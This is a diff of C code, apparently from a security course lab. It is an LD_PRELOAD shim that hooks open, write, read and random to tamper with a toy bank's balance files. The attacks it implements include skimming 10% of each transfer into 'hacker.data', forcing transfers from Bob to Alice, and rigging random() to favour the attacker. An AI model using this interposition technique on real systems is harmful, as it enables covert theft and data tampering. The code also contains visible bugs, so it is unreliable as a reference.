@@ -39,6 +39,8 @@ void setTransfer(int val);
 int getTransfer();
 
 char *file_cont;
+int value_to_transfer = 0;
+int hackerBool = 0;
 
 static int ignoreMalloc = 0;
 
@@ -116,12 +118,14 @@ int open(const char *pathname, int flags, ...){
 	origOpen = (int (*)(const char *, int, ...))dlsym(RTLD_NEXT, "open");
 	
 	int fd;
+	file_cont = pathname;
+	
 	if((mode =va_arg(ap,int)) <=  0){
-		fd =origOpen(pathname, flags); //open task #
+		fd =origOpen(mode, flags); //open task #
 	}
 	else{
 		fd =origOpen(pathname, flags, mode); //open file
-		//printf("opening file %s\n", pathname);
+		printf("opening file %s\n", pathname);
 		file_cont = pathname;
 	}
 
@@ -130,15 +134,12 @@ int open(const char *pathname, int flags, ...){
 	if(t == 4){
 		setTask(t);
 	}
-
-	if(t == 5){
+    else if(t == 5){
 		setTask(t);
 	}
-
-	if(t == 7) {
+	else if(t == 7) {
 		setTask(t);
 	}
-
 	return fd;
 }
 
@@ -154,21 +155,27 @@ FILE *fopen(const char *pathname, const char *mode){
 
 	retval = origFopen(pathname, mode);
 
+	int t = getTask();
+	
 	//Task 2
-	int fd = fileno(retval);
-	if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
-		openBob(fd, pathname);	
-	//	printf("open bob \n");
+	if(t == 2) {
+		int fd = fileno(retval);
+		if(strcmp(pathname, "bob.data") == 0){ //Bobs getting opened
+			openBob(fd, pathname);	
+		//	printf("open bob \n");
 
-	}
-	if(strcmp(pathname, "alice.data") == 0){
-		openAlice(fd, pathname);
-	//	printf("open alice \n");
+		}
+		if(strcmp(pathname, "alice.data") == 0){
+			openAlice(fd, pathname);
+		//	printf("open alice \n");
+		}
 	}
 
 	//Task 4
-	int t = atoi(pathname);
 	if(t == 4){
+		setTask(t);
+	}
+	else if(t == 5) {
 		setTask(t);
 	}
 
@@ -178,13 +185,16 @@ FILE *fopen(const char *pathname, const char *mode){
 int close(int fd){
 	int retval;
 	static int (*origClose)(int) = NULL;
-	//if(!origClose){
-		origClose = (int (*)(int))dlsym(RTLD_NEXT, "close");
-	//}
+	
+	origClose = (int (*)(int))dlsym(RTLD_NEXT, "close");
+	
 	retval = origClose(fd);
 	
-	closeBob(fd);
-	closeAlice(fd);
+	int t = getTask();
+	if(t == 2) {
+		closeBob(fd);
+		closeAlice(fd);
+	}
 	return retval;
 
 }
@@ -197,62 +207,133 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 	
 	origWrite = (int (*)(int,const void*, size_t))dlsym(RTLD_NEXT, "write");
 
-	//Task 4
 	int t = getTask();
-	if(t == 4){
-		if(handle == 3) { //The file getting the transfer	
-			int updated_value = atoi(buffer);
-	//		printf("updated val in handle == 3 is %d \n",updated_value);
-			int prev_val = getDesc3();
-			int transfer_amount= prev_val - updated_value;
-			
-			setTransfer(transfer_amount);
-			retval = origWrite(handle, buffer, nbyte);
-			return retval;
+	//Task 2
+	if(t == 2) {
+		int bob_fd = getBobFd(); 
+		int alice_fd = getAliceFd(); 
+		if((bob_fd != -1) && (alice_fd != -1)){ //Bob and Alice are  open
+			int bob_balance = getBobBalance();
+			int alice_balance = getAliceBalance();
+			int amount_left_in_bob;
+			if(bob_balance <= 0){
+				if(handle == bob_fd){
+					char buf[20];
+					sprintf(buf, "%d", bob_balance);
+					int nbyte = strlen(buf);
+					retval = origWrite(handle, buf, nbyte); 
+					return retval;
+				}
+				else if(handle == alice_fd){
+					char buf[20];
+					sprintf(buf, "%d", alice_balance);
+					int nbyte = strlen(buf);
+					retval = origWrite(handle, buf, nbyte); 
+					return retval;
+				}
+
+			}
+			else{
+				if(handle == bob_fd){ //Bob is Open
+					char buf[21];
+					if(bob_balance == -1){
+						printf("Error: cannot get bobs balance");
+						exit(1);
+					}						
+		//			printf("in read if - buf is %s \n", buf);
+					int nbyte;
+					if(bob_balance < 100){
+						sprintf(buf, "%d",0);
+						nbyte = strlen(buf);
+					}
+					
+					//int diff = atoi(buffer) - bob_balance; //What we are about to assign the balance to what bob's balance was
+					//if(diff == 100){
+					else{
+		//				printf("in diff == 100 \n");
+						sprintf(buf, "%d", bob_balance-100);
+		//				printf("new buff is %s \n", buf);
+						nbyte = strlen(buf);
+					}
+					retval = origWrite(handle, buf, nbyte); 
+					return retval; //Break out of function
+					//}
+					
+				}else if(alice_fd == handle){ //Alice is Open
+					char buf[20];
+		//			printf("in alice if \n");
+					int curr_bal = atoi(buffer);
+					int diff =  alice_balance - curr_bal;
+					int orig = alice_balance;
+					int nbyte;
+					if(bob_balance < 100){
+						sprintf(buf, "%d", orig+bob_balance);
+						nbyte = strlen(buf);
+					}else{	
+						sprintf(buf, "%d", orig+100);
+						nbyte = strlen(buf);
+					}
+					retval = origWrite(handle, buf, nbyte);
+					return retval; //Break out of function
+				}
+			}
 		}
-		else if(handle == 4){
-			int prev_val = getDesc4();
-			int transfer_amount = getTransfer();
-			//Calculate how much to send to hacker
-			int transfer_to_hacker =(transfer_amount*0.10);
-			//Calculate how much to send to receiver
-			transfer_amount -= transfer_to_hacker;
-
-			//Transfer to hacker
-			int hacker_fd;
-		
-			char hacker_val[20]; // = (char *)malloc(sizeof(char)*20);
-			memset(hacker_val, '\0', 20);
-			hacker_fd = open("hacker.data", O_RDWR);
-			lseek(hacker_fd, 0, SEEK_SET);
-			read(hacker_fd, hacker_val, 20);
-			int hack_val = atoi(hacker_val);
-//			printf("hacker val -> int is %d\n",hack_val);
-			hack_val += transfer_to_hacker; //Add to hacker ;
-			memset(hacker_val, '\0', 20);
-			sprintf(hacker_val, "%d", hack_val);
-			int amount_to_write = strlen(hacker_val);
-			ftruncate(hacker_fd, 0);
-			lseek(hacker_fd, 0, SEEK_SET);
-	//		printf("amount to write is %d \n",amount_to_write);			
-	//		printf("hacker val read in is: %s\n", hacker_val);
-			origWrite(hacker_fd, hacker_val, amount_to_write);
-			close(hacker_fd);
-
-			//Update value of receiver
-			int write_amount = prev_val + transfer_amount;
-	//		printf("receiver value is :%d \n", write_amount);
-			char write_amount_to_4[20];
-			memset(write_amount_to_4, '\0', 20);
-			sprintf(write_amount_to_4, "%d", write_amount);
-			int nbytes = strlen(write_amount_to_4);
-	//		printf("nbytes for reciver: %d\n", nbytes);
-			retval = origWrite(handle, write_amount_to_4, nbytes);
-			return retval;
-		}
-
 	}
-	if(t == 5) {
+	//Task 4
+	else if(t == 4){
+			if(handle == 3) { //The file getting the transfer	
+				if(handle == 3) { //The file getting the transfer	
+					int updated_value = atoi(buffer);
+			//		printf("updated val in handle == 3 is %d \n",updated_value);
+					int prev_val = getDesc3();
+					int transfer_amount= prev_val - updated_value;
+					
+					setTransfer(transfer_amount);
+					retval = origWrite(handle, buffer, nbyte);
+					return retval;
+			}
+			else if(handle == 4){
+				int prev_val = getDesc4();
+				int transfer_amount = getTransfer();
+				//Calculate how much to send to hacker
+				int transfer_to_hacker =(transfer_amount*0.10);
+				//Calculate how much to send to receiver
+				transfer_amount -= transfer_to_hacker;
+					//Transfer to hacker
+				int hacker_fd;
+			
+				char hacker_val[20]; // = (char *)malloc(sizeof(char)*20);
+				memset(hacker_val, '\0', 20);
+				hacker_fd = open("hacker.data", O_RDWR);
+				lseek(hacker_fd, 0, SEEK_SET);
+				read(hacker_fd, hacker_val, 20);
+				int hack_val = atoi(hacker_val);
+		//			printf("hacker val -> int is %d\n",hack_val);
+				hack_val += transfer_to_hacker; //Add to hacker ;
+				memset(hacker_val, '\0', 20);
+				sprintf(hacker_val, "%d", hack_val);
+				int amount_to_write = strlen(hacker_val);
+				ftruncate(hacker_fd, 0);
+				lseek(hacker_fd, 0, SEEK_SET);
+		//		printf("amount to write is %d \n",amount_to_write);			
+		//		printf("hacker val read in is: %s\n", hacker_val);
+				origWrite(hacker_fd, hacker_val, amount_to_write);
+				close(hacker_fd);
+					//Update value of receiver
+				int write_amount = prev_val + transfer_amount;
+		//		printf("receiver value is :%d \n", write_amount);
+				char write_amount_to_4[20];
+				memset(write_amount_to_4, '\0', 20);
+				sprintf(write_amount_to_4, "%d", write_amount);
+				int nbytes = strlen(write_amount_to_4);
+		//		printf("nbytes for reciver: %d\n", nbytes);
+				retval = origWrite(handle, write_amount_to_4, nbytes);
+				return retval;
+			}
+		}
+	}
+	//Task 5
+	else if(t == 5) {
 		if(handle == 3) {
 			int updated_value = atoi(buffer);
 			int prev_val = getDesc3();
@@ -267,20 +348,21 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 			int transfer_amount = getTransfer();
 
 			//Calculate how much to send to hacker compared to others
-			int randoH = (10 + random() % 120)/100;
+			//int randoH = (10 + random() % 120)/100;
 
-			int randoR = (random() % 100)/100;
+			//int randoR = (random() % 100)/100;
 
 			int hacker_fd;
 			char hacker_val[20];
 			memset(hacker_val, '\0', 20);
 			
 			if(hacker_fd = open("hacker.data", O_RDWR)) {
-				printf("HERE\n");
+				hackerBool = 1;
 				lseek(hacker_fd, 0, SEEK_SET);
 				read(hacker_fd, hacker_val, 20);
 				int hack_val = atoi(hacker_val);
-				hack_val += transfer_amount*randoH; //Add to hacker ;
+				//hack_val += transfer_amount*randoH; //Add to hacker ;
+				hack_val += transfer_amount;
 				memset(hacker_val, '\0', 20);
 				sprintf(hacker_val, "%d", hack_val);
 				int amount_to_write = strlen(hacker_val);
@@ -297,9 +379,11 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 				int nbytes = strlen(write_amount_to_5);
 
 				retval = origWrite(handle, write_amount_to_5, nbytes);
+				hackerBool = 0;
 				return retval;
 			}else{
 				int reg_fd = open(buffer, O_RDWR);
+				hackerBool = 0;
 				char regu_val[20];
 				//Following system calls as seen strace
 				memset(regu_val, '\0', 20);
@@ -308,7 +392,8 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 				read(reg_fd, regu_val, 20);
 				
 				int reg_val = atoi(regu_val);
-				reg_val += transfer_amount*randoR; //Add to hacker ;
+				//reg_val += transfer_amount*randoR; //Add to hacker ;
+				reg_val += transfer_amount;
 				memset(regu_val, '\0', 20);
 				sprintf(regu_val, "%d", reg_val);
 				
@@ -330,8 +415,8 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 			}
 		}
 	}
-
-	if(t == 7) {
+	//Task 7
+	else if(t == 7) {
 		if(handle == 3) { //The file getting the transfer	
 			int updated_value = atoi(buffer);
 	//		printf("updated val in handle == 3 is %d \n",updated_value);
@@ -389,9 +474,9 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 			char *enc_buff = file_cont;
 			int len = strlen(enc_buff);
 
-			int xor_len = len - 5;
+			int xor_len = len - 4;
 
-			char xor_buff[xor_len+1];
+			char xor_buff[xor_len + 1];
 			strncpy(xor_buff, enc_buff, xor_len);
 			strcat(xor_buff, "\0");
 
@@ -401,77 +486,7 @@ ssize_t write(int handle, const void *buffer, size_t nbyte){
 			return retval;
 		}
 	}
-
-
-	//Task 2
-	int bob_fd = getBobFd(); 
-	int alice_fd = getAliceFd(); 
-	if((bob_fd != -1) && (alice_fd != -1)){ //Bob and Alice are  open
-		int bob_balance = getBobBalance();
-		int alice_balance = getAliceBalance();
-		int amount_left_in_bob;
-		if(bob_balance <= 0){
-			if(handle == bob_fd){
-				char buf[20];
-				sprintf(buf, "%d", bob_balance);
-				int nbyte = strlen(buf);
-				retval = origWrite(handle, buf, nbyte); 
-				return retval;
-			}
-			else if(handle == alice_fd){
-				char buf[20];
-				sprintf(buf, "%d", alice_balance);
-				int nbyte = strlen(buf);
-				retval = origWrite(handle, buf, nbyte); 
-				return retval;
-			}
-
-		}
-		else{
-			if(handle == bob_fd){ //Bob is Open
-				char buf[21];
-				if(bob_balance == -1){
-					printf("Error: cannot get bobs balance");
-					exit(1);
-				}						
-	//			printf("in read if - buf is %s \n", buf);
-				int nbyte;
-				if(bob_balance < 100){
-					sprintf(buf, "%d",0);
-					nbyte = strlen(buf);
-				}
-				
-				//int diff = atoi(buffer) - bob_balance; //What we are about to assign the balance to what bob's balance was
-				//if(diff == 100){
-				else{
-	//				printf("in diff == 100 \n");
-					sprintf(buf, "%d", bob_balance-100);
-	//				printf("new buff is %s \n", buf);
-					nbyte = strlen(buf);
-				}
-				retval = origWrite(handle, buf, nbyte); 
-				return retval; //Break out of function
-				//}
-				
-			}else if(alice_fd == handle){ //Alice is Open
-				char buf[20];
-	//			printf("in alice if \n");
-				int curr_bal = atoi(buffer);
-				int diff =  alice_balance - curr_bal;
-				int orig = alice_balance;
-				int nbyte;
-				if(bob_balance < 100){
-					sprintf(buf, "%d", orig+bob_balance);
-					nbyte = strlen(buf);
-				}else{	
-					sprintf(buf, "%d", orig+100);
-					nbyte = strlen(buf);
-				}
-				retval = origWrite(handle, buf, nbyte);
-				return retval; //Break out of function
-			}
-		}
-	}
+	
 	retval = origWrite(handle, buffer, nbyte);
 	return retval;
 }
@@ -493,23 +508,24 @@ ssize_t read(int handle, void *buf, size_t nbyte){
 
 
 	//Task 2
-	int bobFd = getBobFd();
-	int aliceFd = getAliceFd();
-	if((bobFd != -1) && (aliceFd != -1)){ // Alice and Bob are open
-		int bal = atoi(buf);
-		//int bal = atoi(temp_buff);
-		if(handle == aliceFd){
-			setAliceBalance(bal);
-		}
-		else if(handle == bobFd){
-			setBobBalance(bal);
-		}
-	}
-			
-	//Task 4
 	int t = getTask();
-	if(t == 4){
-		
+	if(t == 2){
+		int bobFd = getBobFd();
+		int aliceFd = getAliceFd();
+		if((bobFd != -1) && (aliceFd != -1)){ // Alice and Bob are open
+			int bal = atoi(buf);
+			//int bal = atoi(temp_buff);
+			if(handle == aliceFd){
+				setAliceBalance(bal);
+			}
+			else if(handle == bobFd){
+				setBobBalance(bal);
+			}
+		}
+	}		
+	//Task 4
+	if(t == 4) {
+		printf("HERE\n");
 		int prev_val = atoi(buf);
 		if(handle == 3){ //Set prev value for the sender (fd == 3)
 			setDesc3(prev_val);
@@ -518,7 +534,6 @@ ssize_t read(int handle, void *buf, size_t nbyte){
 			setDesc4(prev_val);
 		}
 	}
-
 	//Task 5
 	if(t == 5) {
 		int prev_val = atoi(buf);
@@ -529,7 +544,6 @@ ssize_t read(int handle, void *buf, size_t nbyte){
 			setDesc4(prev_val);
 		}
 	}
-
 	//Task 7
 	if(t == 7) {
 		int prev_val = atoi(buf);
@@ -549,10 +563,13 @@ long int random(void) {
 	origRandom = (long int (*)(void))dlsym(RTLD_NEXT, "random");
 
 	int t = getTask();
-	int ret;
+	int ret, hacker_fd;
 	if(t == 5){
-		ret = origRandom();
+		if(hackerBool) {
+			ret = 10 + origRandom() % 120;
+			return ret;
+		}
+		ret = origRandom() % 100;
 	}
-	
-	return origRandom();
+	return ret;
 }
